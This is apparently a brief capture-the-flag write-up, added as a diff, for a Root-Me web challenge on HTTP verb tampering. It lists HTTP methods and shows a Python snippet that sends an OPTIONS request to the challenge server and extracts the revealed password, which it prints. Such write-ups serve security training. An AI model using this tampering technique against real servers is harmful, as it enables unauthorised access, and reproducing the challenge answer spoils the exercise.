@@ -1,0 +1,24 @@
+Webserver Challenge 8 - HTTP Verb Tampering
+
+
+Synopsis: Tamper with HTTP methods:
+
+https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
+Methods/Verbs
+
+GET	RFC 7231	Optional	Yes	Yes	Yes	Yes
+HEAD	RFC 7231	No	No	Yes	Yes	Yes
+POST	RFC 7231	Yes	Yes	No	No	Yes
+PUT	RFC 7231	Yes	Yes	No	Yes	No
+DELETE	RFC 7231	No	Yes	No	Yes	No
+CONNECT	RFC 7231	Yes	Yes	No	No	No
+OPTIONS	RFC 7231	Optional	Yes	Yes	Yes	No
+TRACE	RFC 7231	No	Yes	Yes	Yes	No
+PATCH	RFC 5789	Yes	Yes	No	No	No
+
+Utilizing the OPTIONS method/verb retrieves the password.
+
+In PYthonz:
+>>> r = requests.options('http://challenge01.root-me.org/web-serveur/ch8/')
+>>> re.findall('password : *.*\w\w\w',r.content)
+['password : a23e$dme96d3saez$$prap']
